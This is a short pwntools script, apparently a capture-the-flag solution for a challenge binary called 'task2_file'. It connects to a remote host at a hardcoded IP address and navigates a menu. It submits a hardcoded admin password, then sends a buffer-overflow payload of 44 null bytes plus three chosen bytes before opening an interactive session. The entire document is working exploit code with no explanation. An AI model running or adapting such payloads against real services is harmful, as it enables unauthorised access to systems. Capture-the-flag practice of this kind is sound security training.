from pwn import *

# p = process("./task2_file")
p = remote("62.173.140.174", 17100)

p.sendlineafter(b"[3] Exit.\n\n", b"1")

p.sendlineafter(b"Your choice: \n", b"admin")
p.sendlineafter(b"Enter your login: \n", b"Super_secret_admin_password")
p.sendlineafter(b"Your balance: 1000$\n", b"3")
payload = b"\0" * 44 + p8(0x42) + p8(0x44) + p8(0x43)
p.sendline(payload)
p.interactive()
